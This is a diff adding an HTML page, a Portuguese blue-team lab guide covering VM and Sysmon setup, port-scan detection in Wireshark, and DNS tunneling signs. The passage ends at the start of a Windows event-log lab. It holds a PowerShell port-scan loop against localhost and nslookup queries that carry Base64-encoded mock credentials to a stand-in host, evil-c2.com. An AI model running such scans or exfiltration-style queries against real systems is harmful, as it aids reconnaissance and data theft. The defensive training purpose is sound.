@@ -1,0 +1,1988 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Labs Práticos — Cibersegurança</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap');
+
+:root {
+  --bg: #0d1117;
+  --bg2: #161b22;
+  --bg3: #1c2128;
+  --bg4: #21262d;
+  --border: #30363d;
+  --border2: #3d4450;
+  --cyan: #79c0ff;
+  --green: #3fb950;
+  --green2: #56d364;
+  --yellow: #e3b341;
+  --orange: #f0883e;
+  --red: #ff7b72;
+  --purple: #d2a8ff;
+  --text: #c9d1d9;
+  --text-dim: #8b949e;
+  --text-bright: #f0f6fc;
+  --text-code: #a5d6ff;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'IBM Plex Sans', sans-serif;
+  font-size: 14px;
+  line-height: 1.7;
+}
+
+.mono { font-family: 'IBM Plex Mono', monospace; }
+
+/* SIDEBAR */
+#sidebar {
+  position: fixed;
+  left: 0; top: 0; bottom: 0;
+  width: 260px;
+  background: var(--bg2);
+  border-right: 1px solid var(--border);
+  overflow-y: auto;
+  z-index: 100;
+  padding: 0 0 40px 0;
+}
+
+#sidebar::-webkit-scrollbar { width: 4px; }
+#sidebar::-webkit-scrollbar-track { background: transparent; }
+#sidebar::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+
+.sidebar-header {
+  padding: 20px 16px 16px;
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  background: var(--bg2);
+  z-index: 1;
+}
+
+.sidebar-logo {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  color: var(--green);
+  letter-spacing: 0.1em;
+  margin-bottom: 4px;
+}
+
+.sidebar-title {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text-bright);
+}
+
+.sidebar-section {
+  padding: 12px 16px 4px;
+  font-size: 10px;
+  font-family: 'IBM Plex Mono', monospace;
+  color: var(--text-dim);
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+}
+
+.sidebar-link {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 6px 16px;
+  font-size: 12px;
+  color: var(--text-dim);
+  text-decoration: none;
+  cursor: pointer;
+  transition: all 0.15s;
+  border-left: 2px solid transparent;
+}
+
+.sidebar-link:hover {
+  color: var(--text-bright);
+  background: rgba(255,255,255,0.04);
+}
+
+.sidebar-link.active {
+  color: var(--cyan);
+  border-left-color: var(--cyan);
+  background: rgba(121,192,255,0.06);
+}
+
+.sidebar-link .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  flex-shrink: 0;
+}
+
+.dot-setup { background: var(--text-dim); }
+.dot-redes { background: var(--cyan); }
+.dot-windows { background: var(--orange); }
+.dot-siem { background: var(--green); }
+.dot-forense { background: var(--purple); }
+.dot-malware { background: var(--red); }
+.dot-hunting { background: var(--yellow); }
+
+/* MAIN */
+#main {
+  margin-left: 260px;
+  min-height: 100vh;
+}
+
+.page-header {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 40px 48px 36px;
+}
+
+.page-tag {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  color: var(--green);
+  letter-spacing: 0.1em;
+  margin-bottom: 10px;
+}
+
+.page-h1 {
+  font-size: 28px;
+  font-weight: 700;
+  color: var(--text-bright);
+  line-height: 1.2;
+  margin-bottom: 10px;
+}
+
+.page-sub {
+  font-size: 13px;
+  color: var(--text-dim);
+  font-family: 'IBM Plex Mono', monospace;
+}
+
+/* CONTENT */
+.content { padding: 0 48px 80px; }
+
+/* LAB CARD */
+.lab {
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  margin: 32px 0;
+  overflow: hidden;
+}
+
+.lab-header {
+  padding: 20px 24px;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  cursor: pointer;
+  user-select: none;
+}
+
+.lab-header:hover { background: rgba(255,255,255,0.02); }
+
+.lab-num {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  padding: 3px 8px;
+  border-radius: 4px;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+
+.lab-num-setup { background: rgba(139,148,158,0.15); color: var(--text-dim); border: 1px solid var(--border2); }
+.lab-num-redes { background: rgba(121,192,255,0.12); color: var(--cyan); border: 1px solid rgba(121,192,255,0.3); }
+.lab-num-windows { background: rgba(240,136,62,0.12); color: var(--orange); border: 1px solid rgba(240,136,62,0.3); }
+.lab-num-siem { background: rgba(63,185,80,0.12); color: var(--green); border: 1px solid rgba(63,185,80,0.3); }
+.lab-num-forense { background: rgba(210,168,255,0.12); color: var(--purple); border: 1px solid rgba(210,168,255,0.3); }
+.lab-num-malware { background: rgba(255,123,114,0.12); color: var(--red); border: 1px solid rgba(255,123,114,0.3); }
+.lab-num-hunting { background: rgba(227,179,65,0.12); color: var(--yellow); border: 1px solid rgba(227,179,65,0.3); }
+
+.lab-title-block { flex: 1; }
+.lab-title { font-size: 16px; font-weight: 600; color: var(--text-bright); margin-bottom: 4px; }
+.lab-meta { font-size: 12px; color: var(--text-dim); font-family: 'IBM Plex Mono', monospace; }
+
+.lab-toggle {
+  font-size: 18px;
+  color: var(--text-dim);
+  transition: transform 0.2s;
+  margin-top: 2px;
+}
+
+.lab.open .lab-toggle { transform: rotate(180deg); }
+
+.lab-body { display: none; padding: 0 24px 24px; }
+.lab.open .lab-body { display: block; }
+
+/* OBJETIVO */
+.objetivo {
+  background: rgba(63,185,80,0.06);
+  border: 1px solid rgba(63,185,80,0.2);
+  border-left: 3px solid var(--green);
+  border-radius: 0 6px 6px 0;
+  padding: 12px 16px;
+  margin: 20px 0;
+  font-size: 13px;
+  color: var(--text);
+  line-height: 1.6;
+}
+
+.objetivo strong { color: var(--green2); }
+
+/* PREREQS */
+.prereqs {
+  background: var(--bg3);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 14px 16px;
+  margin-bottom: 20px;
+}
+
+.prereqs-title {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  color: var(--text-dim);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+
+.prereqs ul { list-style: none; }
+.prereqs li { font-size: 12px; color: var(--text); padding: 2px 0; }
+.prereqs li::before { content: '→ '; color: var(--cyan); font-family: 'IBM Plex Mono', monospace; }
+
+/* STEPS */
+.steps { margin: 0; }
+
+.step {
+  margin-bottom: 20px;
+}
+
+.step-header {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-bottom: 10px;
+}
+
+.step-n {
+  width: 26px; height: 26px;
+  border-radius: 50%;
+  background: var(--bg4);
+  border: 1px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  color: var(--text-dim);
+  flex-shrink: 0;
+}
+
+.step-label {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-bright);
+}
+
+.step-body {
+  margin-left: 36px;
+  font-size: 13px;
+  color: var(--text);
+  line-height: 1.7;
+}
+
+/* CODE BLOCK */
+.code-block {
+  background: #010409;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 14px 16px;
+  margin: 10px 0;
+  overflow-x: auto;
+}
+
+.code-block pre {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 12px;
+  line-height: 1.6;
+  color: var(--text-code);
+  white-space: pre;
+}
+
+.code-comment { color: #6e7681; }
+.code-cmd { color: #79c0ff; }
+.code-path { color: #a5d6ff; }
+.code-string { color: #a8ff78; }
+.code-value { color: #ffa657; }
+.code-label { color: #d2a8ff; }
+
+/* BOXES */
+.box-warn {
+  background: rgba(227,179,65,0.06);
+  border: 1px solid rgba(227,179,65,0.25);
+  border-left: 3px solid var(--yellow);
+  border-radius: 0 6px 6px 0;
+  padding: 12px 16px;
+  margin: 12px 0 12px 36px;
+  font-size: 12px;
+  color: var(--text);
+  line-height: 1.6;
+}
+.box-warn strong { color: var(--yellow); }
+
+.box-suspicious {
+  background: rgba(255,123,114,0.06);
+  border: 1px solid rgba(255,123,114,0.25);
+  border-radius: 6px;
+  padding: 14px 16px;
+  margin: 12px 0 12px 36px;
+}
+
+.box-suspicious .box-title {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  color: var(--red);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+
+.box-normal {
+  background: rgba(63,185,80,0.06);
+  border: 1px solid rgba(63,185,80,0.2);
+  border-radius: 6px;
+  padding: 14px 16px;
+  margin: 12px 0 12px 36px;
+}
+
+.box-normal .box-title {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.1em;
+  color: var(--green2);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+
+.box-item {
+  font-size: 12px;
+  color: var(--text);
+  padding: 3px 0;
+  line-height: 1.5;
+}
+.box-item::before { content: '• '; }
+.box-suspicious .box-item::before { color: var(--red); }
+.box-normal .box-item::before { color: var(--green2); }
+
+/* APRENDEU */
+.aprendeu {
+  background: rgba(121,192,255,0.06);
+  border: 1px solid rgba(121,192,255,0.2);
+  border-radius: 6px;
+  padding: 16px 18px;
+  margin-top: 24px;
+}
+
+.aprendeu-title {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.12em;
+  color: var(--cyan);
+  text-transform: uppercase;
+  margin-bottom: 10px;
+}
+
+.aprendeu-item {
+  font-size: 13px;
+  color: var(--text);
+  padding: 3px 0;
+  line-height: 1.5;
+}
+.aprendeu-item::before { content: '✓ '; color: var(--cyan); font-family: 'IBM Plex Mono', monospace; }
+
+/* SECTION BREAK */
+.section-break {
+  margin: 48px 0 8px;
+  padding: 32px 0 20px;
+  border-top: 1px solid var(--border);
+}
+
+.section-break-tag {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 0.15em;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  margin-bottom: 6px;
+}
+
+.section-break-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--text-bright);
+}
+
+/* inline code */
+code {
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  background: var(--bg4);
+  border: 1px solid var(--border2);
+  border-radius: 3px;
+  padding: 1px 5px;
+  color: var(--text-code);
+}
+
+/* divider */
+.divider { border: none; border-top: 1px solid var(--border); margin: 16px 36px; }
+
+/* note inline */
+.note {
+  font-size: 12px;
+  color: var(--text-dim);
+  font-style: italic;
+  margin: 6px 0 6px 36px;
+}
+
+@media (max-width: 768px) {
+  #sidebar { display: none; }
+  #main { margin-left: 0; }
+  .content, .page-header { padding-left: 20px; padding-right: 20px; }
+}
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR -->
+<nav id="sidebar">
+  <div class="sidebar-header">
+    <div class="sidebar-logo">// LABS PRÁTICOS</div>
+    <div class="sidebar-title">Cibersegurança — Hands-On</div>
+  </div>
+
+  <div class="sidebar-section">Setup</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-0')"><span class="dot dot-setup"></span>LAB 0 — Ambiente de Lab</a>
+
+  <div class="sidebar-section">Redes</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-1')"><span class="dot dot-redes"></span>LAB 1 — TCP/IP com Wireshark</a>
+  <a class="sidebar-link" onclick="scrollTo('lab-2')"><span class="dot dot-redes"></span>LAB 2 — DNS Análise e Abuso</a>
+
+  <div class="sidebar-section">Windows + AD</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-3')"><span class="dot dot-windows"></span>LAB 3 — Windows Event Logs</a>
+  <a class="sidebar-link" onclick="scrollTo('lab-4')"><span class="dot dot-windows"></span>LAB 4 — Sysmon Setup e Análise</a>
+  <a class="sidebar-link" onclick="scrollTo('lab-5')"><span class="dot dot-windows"></span>LAB 5 — Active Directory Básico</a>
+
+  <div class="sidebar-section">Blue Team / SIEM</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-6')"><span class="dot dot-siem"></span>LAB 6 — Elastic Stack SIEM</a>
+  <a class="sidebar-link" onclick="scrollTo('lab-7')"><span class="dot dot-siem"></span>LAB 7 — Criar Regras de Detecção</a>
+
+  <div class="sidebar-section">IR + Forense</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-8')"><span class="dot dot-forense"></span>LAB 8 — Forense de Disco</a>
+  <a class="sidebar-link" onclick="scrollTo('lab-9')"><span class="dot dot-forense"></span>LAB 9 — Forense de Memória</a>
+
+  <div class="sidebar-section">Malware</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-10')"><span class="dot dot-malware"></span>LAB 10 — Análise de Malware</a>
+
+  <div class="sidebar-section">Hunting + Intel</div>
+  <a class="sidebar-link" onclick="scrollTo('lab-11')"><span class="dot dot-hunting"></span>LAB 11 — Threat Hunting</a>
+  <a class="sidebar-link" onclick="scrollTo('lab-12')"><span class="dot dot-hunting"></span>LAB 12 — Relatório de Threat Intel</a>
+</nav>
+
+<!-- MAIN -->
+<div id="main">
+  <div class="page-header">
+    <div class="page-tag">// GUIA PRÁTICO DE LABORATÓRIOS</div>
+    <h1 class="page-h1">Do zero ao Threat Hunter<br>— passo a passo, com ferramentas reais</h1>
+    <p class="page-sub">12 labs práticos · do setup ao hunting · tudo gratuito ou quase</p>
+  </div>
+
+  <div class="content">
+
+    <!-- ===================== LAB 0 ===================== -->
+    <div id="lab-0" class="section-break">
+      <div class="section-break-tag">setup inicial</div>
+      <div class="section-break-title">Antes de começar — Monte seu ambiente</div>
+    </div>
+
+    <div class="lab open">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-setup">LAB 0</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Ambiente de Lab — VMs, ferramentas, rede isolada</div>
+          <div class="lab-meta">// base para todos os outros labs · ~2h para montar</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>O que você vai ter no final:</strong> Uma máquina Windows 10 com ferramentas de segurança instaladas e uma rede isolada para fazer experimentos sem risco. Tudo rodando no seu computador.
+        </div>
+
+        <div class="prereqs">
+          <div class="prereqs-title">O que você precisa</div>
+          <ul>
+            <li>Computador com pelo menos 8GB RAM (16GB ideal)</li>
+            <li>50GB de espaço em disco livre</li>
+            <li>VirtualBox ou VMware Player (ambos gratuitos)</li>
+            <li>Boa vontade — esse setup você faz uma vez</li>
+          </ul>
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header">
+              <div class="step-n">1</div>
+              <div class="step-label">Instale o VirtualBox</div>
+            </div>
+            <div class="step-body">
+              Baixe em <code>virtualbox.org</code> e instale normalmente. Escolha VirtualBox se não tiver preferência — é gratuito e completo.
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header">
+              <div class="step-n">2</div>
+              <div class="step-label">Baixe o Windows 10 (imagem oficial da Microsoft — gratuita)</div>
+            </div>
+            <div class="step-body">
+              A Microsoft oferece VMs de avaliação gratuitas para desenvolvedores. Acesse: <code>developer.microsoft.com/en-us/windows/downloads/virtual-machines/</code> e baixe a versão para VirtualBox. É um arquivo .zip com a VM pronta — só importar.
+              <div class="box-warn">
+                <strong>Importante:</strong> Essa VM expira em 90 dias. Tire um snapshot logo após configurar tudo — assim você pode restaurar sem precisar baixar de novo.
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header">
+              <div class="step-n">3</div>
+              <div class="step-label">Importe a VM e crie uma rede interna (isolada)</div>
+            </div>
+            <div class="step-body">
+              No VirtualBox: File → Import Appliance → selecione o .ova baixado. Depois, vá em Settings da VM → Network → mude de "NAT" para <code>Host-Only Adapter</code>. Isso isola a VM — ela não acessa a internet, mas você consegue se comunicar com ela.
+              <div class="box-warn"><strong>Por que isolar?</strong> Você vai executar malware real mais adiante. Com a rede isolada, ele não consegue se comunicar com servidores externos nem se espalhar.</div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header">
+              <div class="step-n">4</div>
+              <div class="step-label">Instale as ferramentas essenciais dentro da VM Windows</div>
+            </div>
+            <div class="step-body">
+              Ligue a VM, abra o browser e baixe/instale:
+              <div class="code-block"><pre><span class="code-comment"># Ferramentas a instalar na VM Windows:</span>
+
+<span class="code-label">Wireshark</span>          → wireshark.org                (análise de rede)
+<span class="code-label">Sysinternals Suite</span> → docs.microsoft.com/sysinternals  (Process Monitor, Autoruns, etc)
+<span class="code-label">7-Zip</span>              → 7-zip.org                    (para extrair amostras de malware)
+<span class="code-label">Notepad++</span>          → notepad-plus-plus.org        (editor de texto avançado)
+<span class="code-label">Python 3</span>           → python.org                   (scripts e automação)</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header">
+              <div class="step-n">5</div>
+              <div class="step-label">Instale o Sysmon (você vai usar muito)</div>
+            </div>
+            <div class="step-body">
+              Sysmon é um serviço da Microsoft que gera logs muito mais detalhados que o Windows por padrão. É gratuito e essencial.
+              <div class="code-block"><pre><span class="code-comment"># 1. Baixe o Sysmon do Sysinternals Suite (já vem no pacote)</span>
+<span class="code-comment"># 2. Baixe uma config pronta — use a do SwiftOnSecurity:</span>
+<span class="code-comment">#    github.com/SwiftOnSecurity/sysmon-config → sysmonconfig-export.xml</span>
+
+<span class="code-comment"># 3. Abra PowerShell como Administrador e rode:</span>
+<span class="code-cmd">cd C:\Tools\Sysinternals</span>
+<span class="code-cmd">.\Sysmon64.exe -accepteula -i sysmonconfig-export.xml</span>
+
+<span class="code-comment"># 4. Confirme que está rodando:</span>
+<span class="code-cmd">Get-Service Sysmon64</span>
+<span class="code-comment"># Status deve ser: Running</span></pre></div>
+              <p style="margin-top:10px; font-size:13px; color: var(--text);">A partir de agora, toda atividade do sistema gera logs detalhados em: <code>Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational</code></p>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header">
+              <div class="step-n">6</div>
+              <div class="step-label">Tire um snapshot da VM limpa</div>
+            </div>
+            <div class="step-body">
+              No VirtualBox, com a VM rodando: Machine → Take Snapshot → chame de "Limpa - ferramentas instaladas". Assim você pode restaurar para esse estado limpo a qualquer momento.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Ao final desse lab você tem</div>
+          <div class="aprendeu-item">VM Windows 10 isolada, pronta para experimentar</div>
+          <div class="aprendeu-item">Sysmon gerando logs detalhados de tudo que acontece no sistema</div>
+          <div class="aprendeu-item">Ferramentas essenciais instaladas e prontas para uso</div>
+          <div class="aprendeu-item">Snapshot para restaurar quando bagunçar (e vai bagunçar — faz parte)</div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ===================== REDES ===================== -->
+    <div id="lab-1" class="section-break">
+      <div class="section-break-tag">redes</div>
+      <div class="section-break-title">TCP/IP, DNS, HTTP — do jeito que analistas enxergam</div>
+    </div>
+
+    <div class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-redes">LAB 1</span>
+        <div class="lab-title-block">
+          <div class="lab-title">TCP/IP com Wireshark — veja conexões reais acontecendo</div>
+          <div class="lab-meta">// handshake, flags, port scan · ~3h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Ver com seus próprios olhos como uma conexão TCP funciona, reconhecer um port scan nos pacotes, e entender por que isso importa para detectar atacantes.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Capture tráfego normal primeiro</div></div>
+            <div class="step-body">
+              Abra o Wireshark na VM. Selecione a interface de rede (geralmente "Ethernet"). Clique em Start. Agora abra o browser e acesse qualquer site HTTP (não HTTPS). Volte ao Wireshark e clique Stop após 30 segundos.
+              <div class="box-warn">
+                <strong>Dica:</strong> Use <code>http://example.com</code> — é um site HTTP simples que não redireciona para HTTPS. Perfeito para ver os pacotes.
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Encontre o handshake TCP</div></div>
+            <div class="step-body">
+              No Wireshark, no campo de filtro, digite: <code>tcp.flags.syn == 1</code> e pressione Enter. Você vai ver os pacotes SYN — o início de cada conexão TCP.
+              <div class="box-normal">
+                <div class="box-title">O que você está vendo — handshake normal</div>
+                <div class="box-item"><strong>SYN</strong> — seu computador diz "quero conectar" ao servidor</div>
+                <div class="box-item"><strong>SYN-ACK</strong> — servidor responde "ok, pode vir"</div>
+                <div class="box-item"><strong>ACK</strong> — seu computador confirma "recebi, vamos começar"</div>
+              </div>
+              Clique em um pacote SYN. No painel de baixo expanda "Transmission Control Protocol". Observe os campos Flags, Source Port, Destination Port.
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Simule um port scan e veja como aparece</div></div>
+            <div class="step-body">
+              Agora você vai gerar tráfego "suspeito" para ver a diferença. Abra o PowerShell e rode:
+              <div class="code-block"><pre><span class="code-comment"># Isso testa conexão nas portas 1 a 1024 do localhost</span>
+<span class="code-comment"># É um "port scan" básico contra você mesmo — sem risco</span>
+<span class="code-cmd">1..1024 | ForEach-Object {</span>
+<span class="code-cmd">  $tcp = New-Object System.Net.Sockets.TcpClient</span>
+<span class="code-cmd">  $tcp.BeginConnect("127.0.0.1", $_, $null, $null) | Out-Null</span>
+<span class="code-cmd">  Start-Sleep -Milliseconds 10</span>
+<span class="code-cmd">  $tcp.Close()</span>
+<span class="code-cmd">}</span></pre></div>
+              Com o Wireshark capturando, aplique o filtro <code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code>.
+              <div class="box-suspicious">
+                <div class="box-title">O que é suspeito — como um port scan aparece</div>
+                <div class="box-item">Muitos pacotes SYN para portas sequenciais (1, 2, 3, 4...) em milissegundos</div>
+                <div class="box-item">Muitos RST-ACK em resposta (porta fechada) — alta relação SYN/RST</div>
+                <div class="box-item">Um único IP de origem varrendo dezenas/centenas de portas</div>
+                <div class="box-item">Tempo entre pacotes: uniforme e muito rápido (automatizado)</div>
+              </div>
+              <div class="box-normal">
+                <div class="box-title">Tráfego normal para comparar</div>
+                <div class="box-item">Poucas conexões SYN para portas específicas (80, 443, 22)</div>
+                <div class="box-item">Handshake completo SYN → SYN-ACK → ACK em seguida</div>
+                <div class="box-item">Tempo entre conexões: variável (humano navegando)</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Aprenda os filtros mais usados no dia a dia</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Filtros Wireshark que você vai usar como analista:</span>
+
+<span class="code-label">ip.addr == 192.168.1.10</span>        <span class="code-comment"># Todo tráfego de/para um IP específico</span>
+<span class="code-label">tcp.port == 443</span>                <span class="code-comment"># Tráfego HTTPS</span>
+<span class="code-label">dns</span>                            <span class="code-comment"># Somente tráfego DNS</span>
+<span class="code-label">http</span>                           <span class="code-comment"># Somente HTTP (não HTTPS)</span>
+<span class="code-label">tcp.flags.rst == 1</span>             <span class="code-comment"># Conexões resetadas (possível scan ou erro)</span>
+<span class="code-label">frame contains "password"</span>      <span class="code-comment"># Procura a palavra "password" nos pacotes</span>
+<span class="code-label">ip.dst == 8.8.8.8</span>             <span class="code-comment"># Tráfego para o DNS do Google</span></pre></div>
+              <p style="font-size:13px; color:var(--text); margin-top: 8px;">Pratique cada um. Entender esses filtros é o que diferencia quem "sabe Wireshark" de quem só abre o programa.</p>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como uma conexão TCP abre e fecha (handshake de 3 vias)</div>
+          <div class="aprendeu-item">Como um port scan se parece no tráfego — padrão de SYNs rápidos e sequenciais</div>
+          <div class="aprendeu-item">Como filtrar tráfego no Wireshark para isolar o que importa</div>
+          <div class="aprendeu-item">A diferença visual entre tráfego normal e tráfego de reconhecimento</div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="lab-2" class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-redes">LAB 2</span>
+        <div class="lab-title-block">
+          <div class="lab-title">DNS — como funciona e como atacantes abusam</div>
+          <div class="lab-meta">// queries, respostas, tunneling · ~2h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Entender como o DNS resolve nomes, identificar queries DNS normais vs suspeitas, e reconhecer o padrão de DNS tunneling — técnica usada por malware para se comunicar sem ser detectado.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Observe queries DNS normais</div></div>
+            <div class="step-body">
+              No Wireshark, inicie uma captura. No PowerShell, rode:
+              <div class="code-block"><pre><span class="code-cmd">nslookup google.com</span>
+<span class="code-cmd">nslookup microsoft.com</span>
+<span class="code-cmd">nslookup github.com</span></pre></div>
+              No Wireshark, filtre: <code>dns</code>. Observe cada query e sua resposta.
+              <div class="box-normal">
+                <div class="box-title">DNS normal — o que você vai ver</div>
+                <div class="box-item">Query tipo A (IPv4) ou AAAA (IPv6) para nomes conhecidos</div>
+                <div class="box-item">Subdomínio simples: <code>google.com</code>, <code>www.microsoft.com</code></div>
+                <div class="box-item">Tamanho da query: pequeno (40–80 bytes)</div>
+                <div class="box-item">Resposta com 1–4 endereços IP</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Simule o padrão de DNS tunneling</div></div>
+            <div class="step-body">
+              DNS tunneling esconde dados dentro de queries DNS. O malware codifica dados em Base64 e os coloca como subdomínio. Veja como isso parece:
+              <div class="code-block"><pre><span class="code-comment"># Simule queries suspeitas no PowerShell (sem risco — não vai resolver)</span>
+<span class="code-cmd">nslookup "aGVsbG8gd29ybGQgdGhpcyBpcyBtYWx3YXJl.evil-c2.com"</span>
+<span class="code-cmd">nslookup "dXNlcm5hbWU6YWRtaW4gcGFzc3dvcmQ6MTIz.evil-c2.com"</span>
+<span class="code-cmd">nslookup "ZXhmaWx0cmF0aW5nIHNlbnNpdGl2ZSBkYXRh.evil-c2.com"</span></pre></div>
+              No Wireshark, filtre <code>dns</code> e compare com as queries anteriores.
+              <div class="box-suspicious">
+                <div class="box-title">Padrão de DNS tunneling — sinais de alerta</div>
+                <div class="box-item">Subdomínio muito longo com caracteres aparentemente aleatórios (Base64)</div>
+                <div class="box-item">Muitas queries para o mesmo domínio pai com subdomínios diferentes</div>
+                <div class="box-item">Queries maiores que 100 bytes — DNS normal é pequeno</div>
+                <div class="box-item">Tipos de query incomuns: TXT, NULL, CNAME usados com frequência alta</div>
+                <div class="box-item">Alto volume de queries DNS de um único host em curto período</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Veja como investigar um domínio suspeito</div></div>
+            <div class="step-body">
+              Em um incidente real, você vai receber um domínio suspeito para investigar. Pratique a investigação:
+              <div class="code-block"><pre><span class="code-comment"># No PowerShell — investigue o domínio (pode usar internet aqui)</span>
+
+<span class="code-comment"># Ver quando o domínio foi registrado (domínio recente = suspeito)</span>
+<span class="code-cmd">nslookup -type=TXT google.com</span>
+
+<span class="code-comment"># Depois no browser, acesse e pesquise o domínio suspeito:</span>
+<span class="code-label">virustotal.com</span>       <span class="code-comment"># → aba Search → cole o domínio</span>
+<span class="code-label">abuseipdb.com</span>        <span class="code-comment"># → pesquise o IP resolvido</span>
+<span class="code-label">whois.domaintools.com</span><span class="code-comment"># → data de registro, registrador</span></pre></div>
+              <div class="box-warn">
+                <strong>Regra prática:</strong> Domínio registrado há menos de 30 dias + detectado no VirusTotal + IPs em AbuseIPDB = IOC confirmado. Documente e adicione ao seu SIEM como regra de bloqueio.
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como uma query DNS normal se parece no Wireshark</div>
+          <div class="aprendeu-item">Os sinais visuais de DNS tunneling — subdomínio longo, Base64, alto volume</div>
+          <div class="aprendeu-item">Como investigar um domínio suspeito usando VirusTotal e AbuseIPDB</div>
+          <div class="aprendeu-item">Por que DNS é um canal favorito de C2 — passa pela maioria dos firewalls</div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ===================== WINDOWS ===================== -->
+    <div id="lab-3" class="section-break">
+      <div class="section-break-tag">windows + event logs</div>
+      <div class="section-break-title">Onde os ataques deixam rastros</div>
+    </div>
+
+    <div class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-windows">LAB 3</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Windows Event Logs — identifique ataques nos logs</div>
+          <div class="lab-meta">// Event IDs críticos, brute-force, escalada · ~3h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Gerar eventos de ataque na sua VM, depois encontrá-los no Event Viewer. Você vai simular um brute-force de senha e ver exatamente como ele aparece nos logs — e como detectá-lo.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
